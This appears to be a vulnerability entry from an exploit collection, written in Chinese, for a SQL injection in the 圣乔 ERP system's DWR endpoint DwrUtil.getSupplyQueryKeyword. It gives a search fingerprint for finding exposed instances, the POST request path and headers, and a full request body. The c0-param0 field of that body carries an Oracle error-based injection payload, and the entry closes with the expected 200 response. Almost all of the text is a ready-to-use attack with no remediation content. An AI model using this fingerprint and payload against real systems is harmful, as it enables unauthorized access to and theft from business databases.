# 圣乔ERP系统存在DwrUtilSQL注入漏洞

- **系统**：圣乔ERP系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="圣乔ERP系统"`
- **请求**：`POST /erp/dwr/call/plaincall/DwrUtil.getSupplyQueryKeyword.dwr HTTP/1.1`
- **关键头**：`Priority: u=0`　`Content-Type: text/plain`

**请求体 / payload**
```
callCount=1
page=/erp/dwr/test/DwrUtil
httpSessionId=
scriptSessionId=7D0BA25CD588C62EB9A08A089C7F368D561
c0-scriptName=DwrUtil
c0-methodName=getSupplyQueryKeyword
c0-id=0
c0-param0=(SELECT UPPER(XMLType(CHR(60)CHR(58)CHR(113)CHR(106)CHR(122)CHR(122)CHR(113)(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)CHR(113)CHR(118)CHR(122)CHR(118)CHR(113)CHR(62))) FROM DUAL)
batchId=9
```
- **预期**：200　|　—